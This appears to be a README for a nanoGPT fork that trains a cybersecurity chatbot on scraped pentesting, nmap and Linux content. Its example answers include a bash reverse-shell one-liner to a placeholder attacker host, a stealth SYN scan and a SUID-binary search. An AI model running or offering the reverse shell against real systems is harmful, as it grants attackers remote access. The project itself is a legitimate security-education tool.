# Cybersecurity Chatbot Training

This repository has been cleaned up and configured to train a specialized cybersecurity chatbot that can assist with penetration testing commands, Linux administration, and nmap usage.

## What This Bot Will Learn

- **Penetration Testing Commands**: Various pentesting tools and techniques
- **Linux Commands**: System administration and security commands  
- **Nmap Commands**: Network scanning and reconnaissance
- **Bash Scripts**: Security automation scripts
- **Cybersecurity Best Practices**: Common procedures and methodologies

## Quick Start

1. **Install Dependencies**:
   ```bash
   pip install -r requirements.txt
   ```

2. **Run the Complete Pipeline**:
   ```bash
   python setup_cybersecurity_bot.py
   ```

## Manual Steps

### 1. Scrape Data
```bash
python data_scraper.py
```
This will create a `scraped_data` directory with cybersecurity content from various sources.

### 2. Prepare Training Data
```bash
python data/prepare_cybersecurity.py
```
This converts the scraped data into the format needed for GPT training.

### 3. Train the Model
```bash
python train.py config/train_cybersecurity.py
```

### 4. Generate Responses
```bash
python sample.py --init_from=resume --out_dir=out-cybersecurity --start="<Q>How do I scan for open ports?</Q>"
```

## Configuration

The model is configured in `config/train_cybersecurity.py` with:
- Smaller model size (8 layers, 512 embedding) for faster training
- Cybersecurity-specific dataset
- Optimized hyperparameters for domain-specific training

## Special Tokens

The chatbot uses special tokens to understand context:
- `<Q>` and `</Q>` for questions
- `<A>` and `</A>` for answers  
- `<CMD>` and `</CMD>` for commands
- `<NMAP>` and `</NMAP>` for nmap specific commands
- `<SCRIPT>` and `</SCRIPT>` for bash scripts

## Example Usage

After training, you can ask questions like:

```
<Q>How do I perform a stealth port scan?</Q>
<A><NMAP>nmap -sS target_ip</NMAP></A>

<Q>Show me a reverse shell command</Q>
<A><CMD>bash -i >& /dev/tcp/attacker_ip/4444 0>&1</CMD></A>

<Q>How do I find SUID binaries?</Q>
<A><CMD>find / -perm -u=s -type f 2>/dev/null</CMD></A>
```

## Training Progress

Monitor training in the `out-cybersecurity` directory:
- `ckpt.pt` - Latest model checkpoint
- Training logs show loss decreasing over time
- Typical training takes 2-6 hours depending on hardware

## Hardware Requirements

- **GPU**: CUDA-compatible GPU recommended (RTX 3060 or better)
- **RAM**: 8GB+ system RAM
- **Storage**: 2GB+ free space for data and model
- **CPU**: If no GPU, training will be much slower but still possible

## Customization

To add more cybersecurity data sources:
1. Edit `data_scraper.py` to include additional URLs
2. Modify `data/prepare_cybersecurity.py` to add new prompt templates
3. Re-run the data preparation pipeline

## Files Kept from Original nanoGPT

- `model.py` - Core GPT implementation
- `train.py` - Training script
- `sample.py` - Text generation
- `configurator.py` - Configuration management
- `config/train_gpt2.py` - Reference config

## Files Added for Cybersecurity

- `data_scraper.py` - Web scraper for cybersecurity content
- `data/prepare_cybersecurity.py` - Data preparation for training
- `config/train_cybersecurity.py` - Training configuration
- `setup_cybersecurity_bot.py` - Complete pipeline script
- `requirements.txt` - Python dependencies

## Troubleshooting

1. **CUDA Out of Memory**: Reduce `batch_size` in config
2. **Slow Training**: Reduce `n_layer` and `n_embd` in config  
3. **Poor Quality**: Increase training time (`max_iters`)
4. **No GPU**: Set `device = 'cpu'` in config (much slower)

## Legal Notice

This tool is for educational and authorized testing purposes only. Always ensure you have permission before testing on any systems you don't own.